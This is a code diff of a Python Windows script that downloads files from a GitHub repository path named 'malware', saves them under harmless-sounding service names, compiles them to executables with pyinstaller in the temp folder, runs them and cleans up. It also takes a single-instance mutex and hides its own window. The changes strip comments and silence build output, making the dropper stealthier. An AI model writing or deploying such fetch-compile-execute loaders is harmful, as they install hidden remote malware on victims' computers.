@@ -14,7 +14,7 @@ def create_mutex(mutex_name):
     try:
         print(f"Creating mutex: {mutex_name}")
         mutex = win32event.CreateMutex(None, 0, mutex_name)
-        if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+        if win32api.GetLastError() == 183:
             print(f"Mutex {mutex_name} already exists.")
             return False
         print(f"Mutex {mutex_name} created successfully.")
@@ -68,7 +68,7 @@ def write_python_file(code, filename):
 def compile_python_to_exe(py_file_path):
     try:
         if py_file_path:
-            print(f"Compiling Python file to EXE: {py_file_path}")
+            print(f"Starting pyinstaller for: {py_file_path}")
             temp_dir = os.getenv('TEMP')
             dist_folder = os.path.join(temp_dir, "dist")
             build_folder = os.path.join(temp_dir, "build")
@@ -81,7 +81,7 @@ def compile_python_to_exe(py_file_path):
                 f'--distpath={dist_folder}',
                 f'--workpath={build_folder}',
                 py_file_path
-            ], check=True)
+            ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
             if os.path.exists(exe_file_path):
@@ -121,7 +121,6 @@ def install_and_execute(urls_and_filenames):
     temp_files = []
     exe_files = []
 
-    # Step 1: Download Python files
     for url, filename in urls_and_filenames:
         code = fetch_python_code(url)
         if code:
@@ -129,23 +128,19 @@ def install_and_execute(urls_and_filenames):
             if py_file_path:
                 temp_files.append(py_file_path)
 
-    # Step 2: Compile each Python file into an executable
     for py_file_path in temp_files:
         exe_file_path = compile_python_to_exe(py_file_path)
         if exe_file_path:
             exe_files.append(exe_file_path)
 
-    # Step 3: Execute the generated executable files
     for exe_file_path in exe_files:
         execute_exe_file(exe_file_path)
 
-    # Step 4: Clean up temporary files and directories
     dist_folder = os.path.join(temp_dir, "dist")
     build_folder = os.path.join(temp_dir, "build")
     temp_files.extend([dist_folder, build_folder])
     clean_up(temp_files)
 
-# URLs and filenames to download and compile
 urls_and_filenames = [
     ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
     ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
@@ -154,21 +149,17 @@ urls_and_filenames = [
 
 def set_invisible():
     try:
-        hwnd = win32gui.GetForegroundWindow()  # Get the handle of the current active window
+        hwnd = win32gui.GetForegroundWindow()
         print(f"Making window with handle {hwnd} invisible.")
-        # Make the window invisible on taskbar
-        ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 is SW_HIDE which hides the window
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
 
-        # Set window transparency to 100% (completely invisible)
         extended_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
         win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, extended_style | win32con.WS_EX_LAYERED)
-        win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)  # Fully transparent
+        win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)
 
-        # Set TopMost to False, so window cannot be touched or interacted with
         win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
 
-        # Make sure the window remains undetected
-        gw.getWindowsWithTitle(pyautogui.getActiveWindowTitle())[0].minimize()  # Minimize the window from taskbar
+        gw.getWindowsWithTitle(pyautogui.getActiveWindowTitle())[0].minimize()
         print(f"Window successfully made invisible.")
     except Exception as e:
         print(f"Error setting window invisible: {e}")
